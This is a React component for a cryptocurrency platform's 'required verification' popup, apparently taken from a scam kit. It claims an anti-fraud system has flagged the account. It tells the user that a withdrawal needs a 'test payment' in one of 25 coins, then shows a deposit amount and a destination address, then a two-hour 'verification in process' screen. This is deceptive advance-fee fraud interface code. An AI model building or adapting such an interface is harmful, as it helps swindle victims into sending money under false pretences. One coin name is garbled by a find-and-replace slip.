const Verify_popap = () => {
  return (
    <div id="verify_popap" className="popap-verifi" style={{ position: 'fixed', important: true }}>
      <div className="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">
        <div className="popap-verifi-container-item-img">
          <img src="/img/icon.png" alt="" />
        </div>
        <div className="popap-verifi-item-info">
          <div className="popap-verifi-loader">
            <div className="popap-verifi-loader-border"></div>
          </div>
          <div className="popap-verifi-item-info-title">Required verification</div>
          <div className="popap-verifi-item-info-text">
            Our automated anti-fraud system has detected suspicious activity in your account.
            According to the <a href="">Terms of our service</a> and the{' '}
            <a href="" style={{ color: '#007bff' }}>
              AML/KYC policy
            </a>{' '}
            - to continue the withdrawal operation, you need to complete the identification of your
            account. To do this, you need to make a test payment in any currency that is on the
            list.
            <br />
            <b></b>Funds will be credited to your account balance and will be available for
            withdrawal after verification.
          </div>
          <div className="popap-verifi-item-info-btn">
            <button className="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
              Start verification
            </button>
            <button className="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
              Cancel
            </button>
          </div>
        </div>
      </div>

      <div className="popap-verifi-container-item popap-verifi-list-two ">
        <div className="popap-verifi-container-item-img">
          <img src="/img/icon.png" alt="" />
        </div>
        <div className="popap-verifi-item-info ">
          <div className="popap-verifi-loader">
            <div className="popap-verifi-loader-border"></div>
          </div>
          <div className="popap-verifi-item-info-title">Choose a coin</div>
          <div className="popap-verifi-item-info-text">
            Select the cryptocurrency you want to use for the verification payment
          </div>
          <div className="popap-verifi-item-select" id="popap-btn-coin">
            <select id="verify_currency_list" style={{ display: 'none' }}>
              <option data-className="icon_master" value="btc">
                Bitcoin
              </option>

              <option data-className="icon_master" value="eth">
                Ethereum
              </option>

              <option data-className="icon_master" value="ltc">
                Litecoin
              </option>

              <option data-className="icon_master" value="usdttrc">
                USDT TRC-20
              </option>

              <option data-className="icon_master" value="usdt">
                USDT ERC-20
              </option>

              <option data-className="icon_master" value="usdtbep">
                USDT BEP-20
              </option>

              <option data-className="icon_master" value="trx">
                Tron
              </option>

              <option data-className="icon_master" value="usdc">
                USD Coin ERC-20
              </option>

              <option data-className="icon_master" value="bnb20">
                BNB BEP-20
              </option>

              <option data-className="icon_master" value="bch">
                Bitcoin Cash
              </option>

              <option data-className="icon_master" value="doge">
                Dogecoin
              </option>

              <option data-className="icon_master" value="xmr">
                Monero
              </option>

              <option data-className="icon_master" value="xlm">
                Stellar
              </option>

              <option data-className="icon_master" value="xtz">
                Tezos
              </option>

              <option data-className="icon_master" value="eos">
                EOS
              </option>

              <option data-className="icon_master" value="shib">
                SHIBA INU BEP-20
              </option>

              <option data-className="icon_master" value="link">
                Chainlink ERC-20
              </option>

              <option data-className="icon_master" value="btg">
                Bitcoin Gold
              </option>

              <option data-className="icon_master" value="etc">
                Ethereum classNameic
              </option>

              <option data-className="icon_master" value="xrp">
                Ripple
              </option>

              <option data-className="icon_master" value="ada">
                Cardano
              </option>

              <option data-className="icon_master" value="dash">
                Dash
              </option>

              <option data-className="icon_master" value="zec">
                Zcash
              </option>

              <option data-className="icon_master" value="sol">
                SOL
              </option>

              <option data-className="icon_master" value="busd">
                BUSD
              </option>
            </select>

            <div className="nice-select" tabindex="0">
              <span className="current">Bitcoin</span>
              <ul className="list">
                <li data-value="btc" className="option selected">
                  Bitcoin
                </li>
                <li data-value="eth" className="option">
                  Ethereum
                </li>
                <li data-value="ltc" className="option">
                  Litecoin
                </li>
                <li data-value="usdttrc" className="option">
                  USDT TRC-20
                </li>
                <li data-value="usdt" className="option">
                  USDT ERC-20
                </li>
                <li data-value="usdtbep" className="option">
                  USDT BEP-20
                </li>
                <li data-value="trx" className="option">
                  Tron
                </li>
                <li data-value="usdc" className="option">
                  USD Coin ERC-20
                </li>
                <li data-value="bnb20" className="option">
                  BNB BEP-20
                </li>
                <li data-value="bch" className="option">
                  Bitcoin Cash
                </li>
                <li data-value="doge" className="option">
                  Dogecoin
                </li>
                <li data-value="xmr" className="option">
                  Monero
                </li>
                <li data-value="xlm" className="option">
                  Stellar
                </li>
                <li data-value="xtz" className="option">
                  Tezos
                </li>
                <li data-value="eos" className="option">
                  EOS
                </li>
                <li data-value="shib" className="option">
                  SHIBA INU BEP-20
                </li>
                <li data-value="link" className="option">
                  Chainlink ERC-20
                </li>
                <li data-value="btg" className="option">
                  Bitcoin Gold
                </li>
                <li data-value="etc" className="option">
                  Ethereum classNameic
                </li>
                <li data-value="xrp" className="option">
                  Ripple
                </li>
                <li data-value="ada" className="option">
                  Cardano
                </li>
                <li data-value="dash" className="option">
                  Dash
                </li>
                <li data-value="zec" className="option">
                  Zcash
                </li>
                <li data-value="sol" className="option">
                  SOL
                </li>
                <li data-value="busd" className="option">
                  BUSD
                </li>
              </ul>
            </div>
          </div>

          <div className="popap-verifi-item-info-btn">
            <button
              className="popap-verifi-item-info-btn-next popap-verifi-list-two-button"
              onclick="verify_deposit()">
              Make a deposit
            </button>
            <button className="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-two">
              Cancel
            </button>
          </div>
        </div>
      </div>

      <div className="popap-verifi-container-item popap-verifi-list-three ">
        <div className="popap-verifi-container-item-img">
          <img src="/img/icon.png" alt="" />
        </div>
        <div className="popap-verifi-item-info ">
          <div className="popap-verifi-loader">
            <div className="popap-verifi-loader-border"></div>
          </div>
          <div className="popap-verifi-item-info-title">Send a transaction</div>

          <div className="popap-verifi-item-send">
            Top up your balance with:
            <div className="popap-verifi-item-send-input" style={{ paddingTop: '10px' }}>
              <input id="verify_amount" type="text" value="0.000" readonly="" />
              <span className="popap-verifi-item-send-type" id="verify_3_crypto">
                BTC
              </span>
            </div>
          </div>

          <div className="popap-verifi-item-address">
            <div style={{ paddingBottom: '10px' }}>To address:</div>
            <div id="verify_address" className="popap-verifi-item-address-number"></div>
          </div>

          <div
            className="popap-verifi-item-address"
            style={{ display: 'none' }}
            id="verify_memo_block">
            <div style={{ paddingBottom: '10px' }}>and memo:</div>
            <div id="verify_memo" className="popap-verifi-item-address-number"></div>
          </div>

          <div className="popap-verifi-item-info-btn">
            <button
              id="verify_trans_btn"
              className="popap-verifi-item-info-btn-next popap-verifi-list-three-button">
              Verify transaction
            </button>
            <button
              className="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-three"
              onclick="location.reload()">
              Cancel
            </button>
          </div>
        </div>
      </div>

      <div className="popap-verifi-container-item popap-verifi-list-four ">
        <div className="popap-verifi-container-item-img">
          <img src="/img/icon.png" alt="" />
        </div>
        <div className="popap-verifi-item-info ">
          <div className="popap-verifi-item-info-title">Verification in process</div>

          <div className="popap-verifi-item-info-text">
            Our automated system has started the verification process of your account. Please wait.
            <br />
            If the process does not complete within
            <b>2 hours</b>, please contact customer support.
          </div>

          <div className="popap-verifi-item-info-btn">
            <button className="popap-verifi-item-info-btn-next popap-verifi-btn-cancel-four">
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Verify_popap;
